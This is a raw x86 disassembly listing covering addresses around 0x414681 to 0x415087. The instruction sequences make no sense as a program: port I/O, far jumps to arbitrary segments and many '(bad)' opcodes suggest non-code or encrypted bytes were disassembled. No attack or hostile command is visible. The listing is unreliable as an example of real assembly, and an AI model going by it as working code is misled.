  414681:	sub    BYTE PTR gs:[edx+0xd6f0],ah
  414688:	add    al,0x1
  41468a:	add    BYTE PTR [eax],al
  41468c:	jg     0x41464a
  41468e:	loopne 0x414667
  414690:	mov    edi,0x85508fc0
  414695:	sbb    bl,BYTE PTR [edi+eiz*8]
  414698:	std    
  414699:	mov    dl,0x71
  41469b:	jp     0x414696
  41469d:	add    bl,BYTE PTR [edx+ebp*2+0x31]
  4146a1:	retf   
  4146a2:	in     al,0x19
  4146a4:	in     al,dx
  4146a5:	push   0xfffffff6
  4146a7:	adc    cl,dl
  4146a9:	or     BYTE PTR [esi+0x2edb4176],0xf
  4146b0:	out    0xf8,eax
  4146b2:	jnp    0x41463e
  4146b4:	jne    0x414730
  4146b6:	mov    bl,0xa1
  4146b8:	pminsw mm0,QWORD PTR [ebx-0x6b7d4b61]
  4146bf:	push   es
  4146c0:	jno    0x414648
  4146c2:	or     al,0x49
  4146c4:	test   DWORD PTR [ebp-0x17],ebx
  4146c7:	or     eax,0x2459da53
  4146cc:	pop    esi
  4146cd:	ds adc edx,eax
  4146d0:	scas   al,BYTE PTR es:[edi]
  4146d1:	dec    eax
  4146d2:	or     ah,bh
  4146d4:	jbe    0x4146a6
  4146d6:	dec    esi
  4146d7:	in     eax,dx
  4146d8:	sub    al,0x2d
  4146da:	jo     0x414691
  4146dc:	ror    DWORD PTR [ebp*8+0x51de2473],0xb6
  4146e4:	mov    dh,0xaf
  4146e6:	cmc    
  4146e7:	rcr    DWORD PTR [ebp-0xd],0xf8
  4146eb:	pop    ds
  4146ec:	adc    DWORD PTR [ebx-0x32],ebx
  4146ef:	pusha  
  4146f0:	cmp    BYTE PTR [ebp+0x9],0x84
  4146f4:	mov    es,WORD PTR [eax-0x19]
  4146f7:	aas    
  4146f8:	imul   eax,DWORD PTR [edx+ebp*4-0x43b5561d],0xfffffff1
  414700:	push   ecx
  414701:	push   0xffffffad
  414703:	cdq    
  414704:	jb     0x41469a
  414706:	sub    ax,0x98ed
  41470a:	ss jmp 0x4146ab
  41470d:	add    al,0x19
  41470f:	nop
  414710:	adc    al,0x9a
  414712:	push   eax
  414713:	dec    edx
  414714:	cdq    
  414715:	push   eax
  414716:	sub    ch,BYTE PTR [esi-0x12]
  414719:	mov    cl,0x26
  41471b:	cs mov ecx,0x390dca3a
  414721:	outs   dx,DWORD PTR ds:[esi]
  414722:	and    DWORD PTR [ebp-0x6e0a82fd],eax
  414728:	fld    DWORD PTR [esi+0x5bd296ef]
  41472e:	and    eax,0xfc2e2a37
  414733:	aam    0xec
  414735:	ds rcl BYTE PTR fs:[ebp-0x13bc6c3e],cl
  41473d:	push   ecx
  41473e:	mov    dl,0x6
  414740:	sbb    dl,BYTE PTR [esi-0x73]
  414743:	jnp    0x4147ad
  414745:	dec    edi
  414746:	subps  xmm2,xmm7
  414749:	dec    esi
  41474a:	mov    cs,WORD PTR [edi+0x1a4296b3]
  414750:	out    dx,eax
  414751:	dec    esp
  414752:	push   ecx
  414753:	or     BYTE PTR [edx],bh
  414755:	xchg   edx,eax
  414756:	and    DWORD PTR [esp+edi*8-0x1c],edx
  41475a:	into   
  41475b:	pop    ss
  41475c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41475d:	jg     0x4147d0
  41475f:	and    BYTE PTR [ecx],0xc8
  414762:	mov    ebp,0xd196194e
  414767:	fbstp  TBYTE PTR [ecx+0x4ced6df9]
  41476d:	out    0x32,al
  41476f:	dec    ebp
  414770:	jmp    0x41474a
  414772:	mov    DWORD PTR [ebx+0x41],ecx
  414775:	dec    ecx
  414776:	fdivrp st(0),st
  414778:	push   esp
  414779:	lods   al,BYTE PTR ds:[esi]
  41477a:	cmp    al,0x36
  41477c:	xchg   ebp,eax
  41477d:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41477f:	dec    eax
  414780:	and    eax,0xce1f790c
  414785:	mov    edi,0x5d50e957
  41478a:	ror    bl,0xc9
  41478d:	mov    DWORD PTR [eax+0x29],ebp
	...
  4147f3:	add    BYTE PTR [esi+0x2f],bh
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x6f349a70
  414804:	hlt    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    al,0x1
  41480a:	add    BYTE PTR [eax],al
  41480c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41480d:	and    ecx,DWORD PTR [ebx-0x3]
  414810:	rol    DWORD PTR [edx+edi*1+0x16727369],cl
  414817:	mov    ebp,0x5a6b0cf0
  41481c:	push   esp
  41481d:	dec    edi
  41481e:	(bad)  
  41481f:	(bad)  [ebp+edx*4-0x20]
  414823:	fistp  WORD PTR [ebx-0x460c58f0]
  414829:	or     DWORD PTR [ebx+0x74],esp
  41482c:	loope  0x4147b3
  41482e:	repnz shl BYTE PTR fs:[ebx],0x57
  414833:	sbb    DWORD PTR ds:0x82c6cbc9,0xf47e1607
  41483d:	push   ecx
  41483e:	aam    0x4b
  414840:	pop    edx
  414841:	push   ebx
  414842:	jno    0x414816
  414844:	scas   al,BYTE PTR es:[edi]
  414845:	push   0x57c49b01
  41484a:	or     dl,ah
  41484c:	lahf   
  41484d:	fadd   DWORD PTR [eax-0x7b434431]
  414853:	mov    al,dl
  414855:	imul   edi,DWORD PTR ds:0x691fb143,0x7208364d
  41485f:	daa    
  414860:	and    eax,ebp
  414862:	not    eax
  414864:	jg     0x4148b2
  414866:	fwait
  414867:	add    al,0x9c
  414869:	ds (bad) 
  41486b:	and    eax,0xc5a26f98
  414870:	pop    es
  414871:	xchg   edx,eax
  414872:	lea    ecx,[ebp+0x58]
  414875:	dec    ebx
  414876:	je     0x4148b3
  414878:	sti    
  414879:	pop    ecx
  41487a:	mov    esp,0x263bfbfa
  41487f:	add    al,0xf2
  414881:	sub    BYTE PTR [ecx],dh
  414883:	mov    al,0xba
  414885:	add    DWORD PTR [ebp-0x80],0xd537c5c6
  41488c:	pop    ebx
  41488d:	movntq QWORD PTR [ebx],mm0
  414890:	adc    cl,cl
  414892:	sub    BYTE PTR [eax+0x1d],dh
  414895:	mov    esi,0xaf7f52ac
  41489a:	sub    ecx,DWORD PTR [esi+ecx*1]
  41489d:	jnp    0x414888
  41489f:	fucomi st,st(5)
  4148a1:	jmp    0x12d4ee64
  4148a6:	mov    edi,DWORD PTR cs:[edx]
  4148a9:	adc    DWORD PTR [ebx+0x29ec400d],esp
  4148af:	sti    
  4148b0:	stos   BYTE PTR es:[edi],al
  4148b1:	test   DWORD PTR [ebx],ebp
  4148b3:	xchg   ebx,eax
  4148b4:	ins    DWORD PTR es:[edi],dx
  4148b5:	repnz lds edi,FWORD PTR [esp+esi*4+0x2420fa8e]
  4148bd:	arpl   WORD PTR [edi-0x6a14bed7],sp
  4148c3:	out    dx,al
  4148c4:	das    
  4148c5:	clc    
  4148c6:	fucom  st(7)
  4148c8:	jnp    0x4148e3
  4148ca:	outs   dx,DWORD PTR ds:[esi]
  4148cb:	jle    0x4148b7
  4148cd:	outs   dx,BYTE PTR ds:[esi]
  4148ce:	sub    bl,BYTE PTR [bp+di+0x6d21]
  4148d3:	mov    edx,0xcc3ff874
  4148d8:	sbb    DWORD PTR [ebp+0x2d],esp
  4148db:	inc    esi
  4148dc:	or     ah,ch
  4148de:	xor    ebx,ebp
  4148e0:	stos   DWORD PTR es:[edi],eax
  4148e1:	std    
  4148e2:	test   DWORD PTR [edi+0x4c09d1b9],0xabe76a0c
  4148ec:	or     BYTE PTR [esi],ch
  4148ee:	ficom  WORD PTR [ebx]
  4148f0:	jmp    0xffdb:0xf1ed4f33
  4148f7:	fisubr WORD PTR [edi+esi*2]
  4148fa:	jns    0x414951
  4148fc:	pop    edx
  4148fd:	sbb    edx,DWORD PTR es:0x3ef08424
  414904:	or     DWORD PTR ds:0xa1982c58,ebp
  41490a:	scas   eax,DWORD PTR es:[edi]
  41490b:	jb     0x41491d
  41490d:	ret    0xa84a
	...
  414974:	or     edi,DWORD PTR [esi-0x2e]
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	sub    BYTE PTR [eax-0x29],al
  414983:	push   eax
  414984:	clc    
  414985:	fadd   DWORD PTR [eax]
  414987:	add    BYTE PTR [ecx+eax*1],al
  41498a:	add    BYTE PTR [eax],al
  41498c:	cmp    al,0x60
  41498e:	adc    al,0x82
  414990:	xor    dl,cl
  414992:	mov    fs,WORD PTR [ebp+0x10928a3]
  414998:	fwait
  414999:	test   al,0x80
  41499b:	das    
  41499c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41499d:	test   al,0x11
  41499f:	loopne 0x4149ef
  4149a1:	stos   DWORD PTR es:[edi],eax
  4149a2:	addr16 jae 0x41494b
  4149a5:	xchg   edi,ecx
  4149a7:	clc    
  4149a8:	inc    esi
  4149a9:	sub    eax,0x76160079
  4149ae:	je     0x414992
  4149b0:	or     BYTE PTR [edx-0x45],0x11
  4149b4:	xchg   DWORD PTR [ebp-0x60fbfca],esp
  4149ba:	sub    bh,ch
  4149bc:	mov    esi,esi
  4149be:	push   cs
  4149bf:	jp     0x414965
  4149c1:	pop    ecx
  4149c2:	movd   mm4,DWORD PTR [edi]
  4149c5:	pop    edi
  4149c6:	cmp    ebx,DWORD PTR [edx+0x35]
  4149c9:	mov    cl,0x85
  4149cb:	xor    BYTE PTR [edx-0x7b],al
  4149ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149cf:	mov    bl,0xac
  4149d1:	jp     0x4149b1
  4149d3:	clc    
  4149d4:	xchg   edx,eax
  4149d5:	pop    esi
  4149d6:	sub    dh,BYTE PTR [edi+0x122936d4]
  4149dc:	mov    edx,0xccc668ca
  4149e1:	imul   ebx,DWORD PTR ds:0x9226ad70,0x4902e6f8
  4149eb:	in     al,0x4c
  4149ed:	outs   dx,DWORD PTR ds:[esi]
  4149ee:	ja     0x414a55
  4149f0:	push   esp
  4149f1:	jb     0x4149e3
  4149f3:	xlat   BYTE PTR ds:[ebx]
  4149f4:	pop    ebx
  4149f5:	mov    edi,eax
  4149f7:	aam    0xff
  4149f9:	jne    0x414a55
  4149fb:	sub    BYTE PTR [edx+eax*1-0x6],bl
  4149ff:	out    0x66,eax
  414a01:	imul   BYTE PTR [ebx]
  414a03:	dec    edi
  414a04:	mov    ch,0xf1
  414a06:	fsub   DWORD PTR [ecx-0x3844b023]
  414a0c:	cmp    bh,bh
  414a0e:	jp     0x414a67
  414a10:	out    dx,eax
  414a11:	add    al,0x81
  414a13:	ret    0xe509
  414a16:	fwait
  414a17:	call   FWORD PTR [ebx+ebp*4+0x4b]
  414a1b:	add    DWORD PTR [ebp-0x47],esi
  414a1e:	add    dl,bh
  414a20:	gs pop edi
  414a22:	dec    ebx
  414a23:	pop    edx
  414a24:	add    esp,DWORD PTR [ecx-0x1e]
  414a27:	and    eax,0xa972af35
  414a2c:	inc    BYTE PTR [ebp-0x5e7e142a]
  414a32:	sbb    al,0x96
  414a34:	js     0x4149fc
  414a36:	inc    edi
  414a37:	rcr    DWORD PTR [ecx+0x5e],1
  414a3a:	add    eax,0x18fa8060
  414a3f:	sub    BYTE PTR [ebx],0x6b
  414a42:	fiadd  WORD PTR [eax+0x4d5fd3dc]
  414a48:	push   edi
  414a49:	cmp    BYTE PTR ds:0x14dfdfde,bl
  414a4f:	pop    esp
  414a50:	push   esp
  414a51:	in     al,0xa7
  414a53:	dec    eax
  414a54:	stc    
  414a55:	fild   QWORD PTR [esi*4+0x69a45c01]
  414a5c:	add    eax,DWORD PTR [ebx]
  414a5e:	jns    0x4149f2
  414a60:	push   ds
  414a61:	(bad)
  414a64:	inc    edi
  414a65:	sub    dl,BYTE PTR [edx]
  414a67:	mov    ebx,0x1c360dab
  414a6c:	imul   esp,edi,0x334cf160
  414a72:	cli    
  414a73:	xor    al,0x7a
  414a75:	(bad)  
  414a77:	shr    BYTE PTR [ebp-0x41],cl
  414a7a:	mov    al,ds:0x7de782ef
  414a7f:	sub    edi,DWORD PTR [edx-0x405fc686]
  414a85:	(bad)  
  414a86:	les    edx,FWORD PTR [edx+0x1882df32]
  414a8c:	xlat   BYTE PTR fs:[ebx]
  414a8e:	retf   
  414a8f:	rol    BYTE PTR [eax],cl
	...
  414af1:	add    BYTE PTR [eax],al
  414af3:	add    BYTE PTR [edi+0x7e363ed9],bl
  414af9:	neg    DWORD PTR [edi-0x265c9d07]
  414aff:	arpl   WORD PTR [ecx-0x37b96f2],cx
  414b05:	fld    DWORD PTR [eax]
  414b07:	add    BYTE PTR [ecx+eax*1],al
  414b0a:	add    BYTE PTR [eax],al
  414b0c:	or     al,0x91
  414b0e:	repz out 0x6f,eax
  414b11:	in     al,0x56
  414b13:	jl     0x414b24
  414b15:	into   
  414b16:	or     DWORD PTR [eax-0x7a9c59cb],0x66d69449
  414b20:	test   eax,0xa3d0f0fe
  414b25:	dec    edi
  414b26:	adc    eax,0x6f5782ce
  414b2b:	mov    WORD PTR [edi],gs
  414b2d:	pop    edx
  414b2e:	mov    ebp,0xc7087988
  414b33:	xchg   edx,eax
  414b34:	shl    BYTE PTR [eax],1
  414b36:	mov    cl,0xdd
  414b38:	fistp  WORD PTR [edx]
  414b3a:	call   0xd781:0x82d948cb
  414b41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b42:	cld    
  414b43:	jp     0x414bbb
  414b45:	arpl   bp,sp
  414b47:	mov    esp,0x38e6c133
  414b4c:	test   DWORD PTR [esi-0xe],eax
  414b4f:	(bad)  
  414b50:	push   0x133b81ab
  414b55:	sub    edx,edi
  414b57:	push   ss
  414b58:	lods   al,BYTE PTR ds:[esi]
  414b59:	retf   0x4d5d
  414b5c:	sub    al,0xf5
  414b5e:	loope  0x414b38
  414b60:	int3   
  414b61:	dec    eax
  414b62:	fimul  DWORD PTR [esi-0x57fcf582]
  414b68:	push   edx
  414b69:	test   dh,bh
  414b6b:	es shl BYTE PTR ds:[edi],1
  414b6f:	cmp    edi,DWORD PTR [edi]
  414b71:	loopne 0x414b48
  414b73:	jl     0x414bf2
  414b75:	or     eax,0x696f21e3
  414b7a:	(bad)  
  414b7b:	nop
  414b7c:	ret    0x8b84
  414b7f:	fyl2xp1 
  414b81:	nop
  414b82:	push   ecx
  414b83:	mov    DWORD PTR [ebx+esi*4+0x5c],esp
  414b87:	fimul  DWORD PTR [ecx-0x5c0f7527]
  414b8d:	xor    esi,ebx
  414b8f:	jbe    0x414c0b
  414b91:	or     al,0x14
  414b93:	and    BYTE PTR [edx],cl
  414b95:	rcr    BYTE PTR [ebp-0x1a],cl
  414b98:	inc    esi
  414b99:	loop   0x414c0f
  414b9b:	inc    edi
  414b9c:	ficomp DWORD PTR [ecx]
  414b9e:	stos   DWORD PTR es:[edi],eax
  414b9f:	push   ecx
  414ba0:	mov    ah,0xad
  414ba2:	pop    es
  414ba3:	(bad)  
  414ba4:	xor    al,0x8e
  414ba6:	test   eax,0x250361ac
  414bab:	mul    BYTE PTR [ebx+0x6ff82fc7]
  414bb1:	sahf   
  414bb2:	test   ebp,esp
  414bb4:	mov    al,0x21
  414bb6:	in     al,dx
  414bb7:	in     al,dx
  414bb8:	xchg   ebp,eax
  414bb9:	ror    BYTE PTR [ebx+ecx*2],0x2c
  414bbd:	ss scas eax,DWORD PTR es:[edi]
  414bbf:	push   edx
  414bc0:	mov    al,ch
  414bc2:	xchg   ebx,eax
  414bc3:	out    dx,al
  414bc4:	mov    bh,0x5c
  414bc6:	cdq    
  414bc7:	std    
  414bc8:	xor    ah,BYTE PTR [ebx]
  414bca:	aaa    
  414bcb:	test   eax,0x9b8bfda3
  414bd0:	rol    ah,0x17
  414bd3:	xchg   edx,eax
  414bd4:	sub    al,0x2f
  414bd6:	pop    ds
  414bd7:	(bad)  
  414bd8:	sahf   
  414bd9:	lock mov esi,0x8ea53386
  414bdf:	inc    eax
  414be0:	pushf  
  414be1:	inc    esi
  414be2:	jnp    0x414baf
  414be4:	jp     0x414bbd
  414be6:	test   DWORD PTR [ebx+0x7d54bd84],eax
  414bec:	inc    edx
  414bed:	aaa    
  414bee:	mov    fs,WORD PTR [ebp-0x210e83ed]
  414bf4:	adc    eax,0x6d8cc2a6
  414bf9:	inc    esp
  414bfa:	inc    edx
  414bfb:	cld    
  414bfc:	mov    al,0xbe
  414bfe:	enter  0x6844,0xb7
  414c02:	sbb    eax,0x24444417
  414c07:	or     ebp,DWORD PTR [eax+0xd]
  414c0a:	adc    edx,DWORD PTR gs:[eax+edx*2-0x60]
  414c0f:	cmc    
	...
  414c74:	xor    al,0x64
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    ebx,DWORD PTR cs:[ecx+eiz*2-0x5a]
  414c83:	dec    ebx
  414c84:	add    bl,bl
  414c86:	add    BYTE PTR [eax],al
  414c88:	add    al,0x1
  414c8a:	add    BYTE PTR [eax],al
  414c8c:	call   0x4cbd:0xcfa2ca09
  414c93:	xchg   ebx,eax
  414c94:	fwait
  414c95:	push   esp
  414c96:	xor    DWORD PTR [esi+0x24],eax
  414c99:	rcl    DWORD PTR [ecx+eax*1],1
  414c9c:	mov    cl,bh
  414c9e:	mov    edx,0x696c8f5
  414ca3:	in     eax,0x68
  414ca5:	dec    DWORD PTR [eax+eiz*2]
  414ca8:	(bad)  
  414caa:	xchg   edi,eax
  414cab:	pop    edi
  414cac:	mov    BYTE PTR [ebx-0x39],dh
  414caf:	add    DWORD PTR fs:[esi-0x5a14c16c],0xfffffffe
  414cb7:	mov    esi,0x8c33a45c
  414cbc:	lods   al,BYTE PTR ds:[esi]
  414cbd:	dec    ecx
  414cbe:	(bad)  
  414cbf:	(bad)  
  414cc0:	std    
  414cc1:	cmp    ch,BYTE PTR [edx]
  414cc3:	xor    bl,bl
  414cc5:	out    0xb3,al
  414cc7:	ins    BYTE PTR es:[edi],dx
  414cc8:	aad    0x6b
  414cca:	or     eax,0x1023eaff
  414ccf:	(bad)  
  414cd0:	push   ebp
  414cd1:	pop    ecx
  414cd2:	mov    BYTE PTR [ebp+0x9],bl
  414cd5:	ror    esp,0x78
  414cd8:	and    DWORD PTR ds:0xa5bf3593,edi
  414cde:	xchg   edi,eax
  414cdf:	jl     0x414d57
  414ce1:	lods   eax,DWORD PTR ds:[esi]
  414ce2:	adc    DWORD PTR [ecx-0x2882b6fa],ebx
  414ce8:	ins    DWORD PTR es:[edi],dx
  414ce9:	call   0x7b9dc2cc
  414cee:	arpl   WORD PTR [edx],di
  414cf0:	mov    esi,0x98ecca00
  414cf5:	mov    edi,0xd62f746d
  414cfa:	dec    ebp
  414cfb:	and    eax,0x34ede02b
  414d00:	(bad)  
  414d01:	sbb    cl,BYTE PTR [esi-0xf089e21]
  414d07:	std    
  414d08:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  414d0a:	aad    0x47
  414d0c:	inc    esp
  414d0d:	call   0xb813e94
  414d12:	mov    al,0x2a
  414d14:	sbb    DWORD PTR [esi],esi
  414d16:	gs lahf 
  414d18:	xchg   edx,ebx
  414d1a:	(bad)  
  414d1b:	fmul   st(6),st
  414d1d:	popa   
  414d1e:	(bad)  
  414d1f:	and    DWORD PTR [edi-0x400c3452],ebp
  414d25:	mov    al,BYTE PTR [ebx+0x68bfb256]
  414d2b:	(bad)  
  414d2c:	aaa    
  414d2d:	and    ebp,eax
  414d2f:	mov    esp,DWORD PTR [edi+0x3b5bef71]
  414d35:	sub    BYTE PTR [eax-0x5b644638],dh
  414d3b:	fcmovnb st,st(6)
  414d3d:	std    
  414d3e:	ret    
  414d3f:	addr16 ja 0x414d51
  414d42:	(bad)  [esi-0x60a14636]
  414d48:	add    BYTE PTR [edx+0x1d],0x89
  414d4c:	loope  0x414ce7
  414d4e:	pop    es
  414d4f:	sahf   
  414d50:	mov    ecx,0xd2d122c5
  414d55:	sub    ah,BYTE PTR [eax+edx*2-0x27bb9439]
  414d5c:	xchg   ecx,eax
  414d5d:	mov    es,WORD PTR [ebp-0x73]
  414d60:	mov    edx,0x615a3e85
  414d65:	repnz mov cl,0xa4
  414d68:	xchg   edx,eax
  414d69:	pop    es
  414d6a:	jecxz  0x414d0a
  414d6c:	je     0x414d97
  414d6e:	popa   
  414d6f:	jmp    0x98b2:0x7007622f
  414d76:	mov    edi,0x90fe9d14
  414d7b:	add    DWORD PTR [esi+0x53],edi
  414d7e:	pushf  
  414d7f:	stc    
  414d80:	push   esp
  414d81:	sbb    al,BYTE PTR [ecx-0x66]
  414d84:	mov    WORD PTR [ecx-0x55],cs
  414d87:	call   0x1047:0xa69b3e30
  414d8e:	cmc    
  414d8f:	adc    eax,0x0
	...
  414df4:	mov    bh,0x99
  414df6:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x4fcd76e0
  414e04:	add    al,0xdc
  414e06:	add    BYTE PTR [eax],al
  414e08:	add    al,0x1
  414e0a:	add    BYTE PTR [eax],al
  414e0c:	xchg   BYTE PTR [esi-0x53],dl
  414e0f:	mov    dl,0x57
  414e11:	ss scas al,BYTE PTR es:[edi]
  414e13:	push   0x346a9d5a
  414e18:	es cwde 
  414e1a:	cmp    DWORD PTR [esi],ebp
  414e1c:	or     BYTE PTR [ebp+0xa20284a],cl
  414e22:	push   cs
  414e23:	test   DWORD PTR [eax+0x5],0x10489c5d
  414e2a:	das    
  414e2b:	dec    edi
  414e2c:	push   eax
  414e2d:	sub    bh,BYTE PTR [ebp-0x9]
  414e30:	pusha  
  414e31:	fldenv [esi+0x1fae45fc]
  414e37:	call   0xd9f445c
  414e3c:	pop    ecx
  414e3d:	jg     0x414e45
  414e3f:	outs   dx,DWORD PTR ds:[esi]
  414e40:	mov    dl,0x96
  414e42:	and    edi,edi
  414e44:	dec    ebp
  414e45:	adc    BYTE PTR [edx+ebx*8+0x545aabb8],0xac
  414e4d:	stos   BYTE PTR es:[edi],al
  414e4e:	aad    0xf3
  414e50:	pop    ss
  414e51:	xor    al,0x8c
  414e53:	mov    al,ds:0x2b4638b3
  414e58:	mov    bl,0x7d
  414e5a:	aaa    
  414e5b:	(bad)  
  414e5d:	push   eax
  414e5e:	pop    ds
  414e5f:	adc    DWORD PTR [esi],edx
  414e61:	mov    ebp,0x605bb7a
  414e66:	in     eax,dx
  414e67:	push   cs
  414e68:	ret    
  414e69:	push   esp
  414e6a:	test   eax,0xcfafb8c8
  414e6f:	scas   eax,DWORD PTR es:[edi]
  414e70:	jo     0x414e90
  414e72:	ficom  WORD PTR [esi+0x5c27c68b]
  414e78:	or     DWORD PTR [edi],esp
  414e7a:	mov    eax,0x1ff7ac26
  414e7f:	mov    ebp,0xa2a6459
  414e84:	inc    ebx
  414e85:	dec    eax
  414e86:	fcomp  DWORD PTR [ebx]
  414e88:	daa    
  414e89:	leave  
  414e8a:	imul   DWORD PTR [ebp+0x947300a]
  414e90:	inc    edi
  414e91:	fcom   DWORD PTR [edi]
  414e93:	retf   0xc44b
  414e96:	(bad)  
  414e97:	pop    esp
  414e98:	popf   
  414e99:	cmp    DWORD PTR ds:0x2479075,ecx
  414e9f:	bound  eax,QWORD PTR [eax-0x691725ce]
  414ea5:	push   ecx
  414ea6:	pop    edx
  414ea7:	inc    edx
  414ea8:	dec    edx
  414ea9:	or     al,0x5e
  414eab:	aaa    
  414eac:	sbb    al,0x2b
  414eae:	outs   dx,DWORD PTR ds:[esi]
  414eaf:	jl     0x414eb0
  414eb1:	push   ds
  414eb2:	and    DWORD PTR [ecx],ebx
  414eb4:	push   ebx
  414eb5:	cli    
  414eb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eb7:	fisub  WORD PTR [edx+0x74]
  414eba:	sub    al,0xe2
  414ebc:	rcl    BYTE PTR [ecx+0x4487d9a6],cl
  414ec2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ec3:	cmp    DWORD PTR [edx-0x4d],esp
  414ec6:	dec    eax
  414ec7:	pop    ecx
  414ec8:	and    al,0x8c
  414eca:	push   0xfffffff5
  414ecc:	pop    edi
  414ecd:	jmp    0x2d872c3e
  414ed2:	int3   
  414ed3:	or     ah,BYTE PTR ss:[edi]
  414ed6:	sbb    ebp,edi
  414ed8:	xor    eax,0xf40b9007
  414edd:	(bad)  [ebx]
  414edf:	push   ecx
  414ee0:	adc    ebx,ecx
  414ee2:	lods   eax,DWORD PTR ds:[esi]
  414ee3:	(bad)  
  414ee7:	mov    ah,0xa0
  414ee9:	push   esi
  414eea:	xlat   BYTE PTR ds:[ebx]
  414eeb:	(bad)  
  414eec:	(bad)  
  414eed:	adc    eax,0xa9707048
  414ef2:	push   es
  414ef3:	push   ds
  414ef4:	cmp    eax,0x2e974da6
  414ef9:	fisubr DWORD PTR [ebp-0x63]
  414efc:	sbb    BYTE PTR [edx-0x6c],dh
  414eff:	xchg   edi,eax
  414f00:	fwait
  414f01:	fs jbe 0x414f4a
  414f04:	mov    eax,0xc1b4eff0
  414f09:	(bad)
  414f0c:	xor    DWORD PTR [edx+edx*8-0x21],eax
	...
  414f74:	aaa    
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd08:0x3d317236
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    al,0x1
  414f8a:	add    BYTE PTR [eax],al
  414f8c:	jg     0x414f2a
  414f8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f8f:	cs or  al,0x26
  414f92:	div    BYTE PTR [eax-0x5a]
  414f95:	push   ebx
  414f96:	xchg   edx,eax
  414f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f98:	inc    esp
  414f99:	sti    
  414f9a:	mov    al,0xfa
  414f9c:	mov    cl,0xe5
  414f9e:	push   edx
  414f9f:	sar    BYTE PTR [ecx],1
  414fa1:	mul    BYTE PTR [ebx+0x6a55f794]
  414fa7:	push   edi
  414fa8:	cmp    BYTE PTR [esi-0x1aa922f9],ch
  414fae:	clc    
  414faf:	cwde   
  414fb0:	fcomp  DWORD PTR [ebx+edx*2+0x11]
  414fb4:	jecxz  0x414fe2
  414fb6:	jecxz  0x414fed
  414fb8:	add    ah,BYTE PTR [ebx]
  414fba:	push   ds
  414fbb:	call   0x99db:0x87a819e3
  414fc2:	cmp    eax,0x2c8d29cd
  414fc7:	in     eax,dx
  414fc8:	or     DWORD PTR [esp+edi*2],ebp
  414fcb:	(bad)  
  414fcd:	scas   eax,DWORD PTR es:[edi]
  414fce:	repz les ebx,FWORD PTR [edx-0x15a26966]
  414fd5:	jp     0x414f6d
  414fd7:	fcmovnbe st,st(6)
  414fd9:	jp     0x414fb1
  414fdb:	lods   al,BYTE PTR ds:[esi]
  414fdc:	ins    DWORD PTR es:[edi],dx
  414fdd:	fdivr  st(6),st
  414fdf:	and    al,0xd4
  414fe1:	or     DWORD PTR [esi],esp
  414fe3:	ror    DWORD PTR [esi-0x50412b6c],0xe6
  414fea:	popa   
  414feb:	vpaddusb xmm1,xmm4,XMMWORD PTR [edx-0x2ea04d2a]
  414ff3:	aad    0x3e
  414ff5:	pop    esi
  414ff6:	popf   
  414ff7:	inc    ecx
  414ff8:	xor    bl,BYTE PTR [ebx]
  414ffa:	aas    
  414ffb:	lods   al,BYTE PTR ds:[esi]
  414ffc:	pop    ebp
  414ffd:	push   esp
  414ffe:	test   al,0xed
  415000:	dec    eax
  415001:	aas    
  415002:	xor    edx,ebp
  415004:	test   ch,ch
  415006:	cmp    DWORD PTR [esi-0x34],ecx
  415009:	pop    edx
  41500a:	fld    DWORD PTR [eax+0x1f]
  41500d:	jge    0x414f9c
  41500f:	mov    ecx,0x133ed834
  415014:	std    
  415015:	mov    ds:0x3c28e4aa,al
  41501a:	(bad)  
  41501b:	in     eax,dx
  41501c:	and    eax,0x7d144d9
  415021:	dec    esi
  415022:	inc    esi
  415023:	retf   
  415024:	enter  0x37a0,0x9d
  415028:	inc    ebx
  415029:	mov    eax,0x9d06bd72
  41502e:	sahf   
  41502f:	mov    edi,0xd63f40b7
  415034:	ds das 
  415036:	leave  
  415037:	xchg   DWORD PTR [esi+0x38f4dbaa],ecx
  41503d:	push   ebp
  41503e:	push   ebx
  41503f:	test   DWORD PTR [eax],edx
  415041:	dec    ecx
  415042:	shr    DWORD PTR [edx],0xe4
  415045:	dec    eax
  415046:	pop    ecx
  415047:	scas   eax,DWORD PTR es:[edi]
  415048:	cwde   
  415049:	push   0x2d2004b0
  41504e:	push   0x8b76a0e3
  415053:	mov    esp,0x4ac34e58
  415058:	repz jg 0x4150a4
  41505b:	pop    edx
  41505c:	fld    TBYTE PTR [ebx]
  41505e:	xor    eax,0x5eb92ae7
  415063:	lock test cl,bh
  415066:	jb     0x41507e
  415068:	jo     0x415041
  41506a:	iret   
  41506b:	sub    ecx,DWORD PTR ds:0xb2156c36
  415071:	mov    ?,WORD PTR [ecx-0x397f5bf3]
  415077:	test   BYTE PTR [ebp+0x7b],ch
  41507a:	je     0x4150d4
  41507c:	cmp    al,0xa2
  41507e:	adc    edi,DWORD PTR [eax+0x3c]
  415081:	shl    BYTE PTR [ebx],cl
  415083:	popf   
  415084:	in     al,0x89
  415086:	xchg   esp,eax
  415087:	or     eax,0x91e172c2
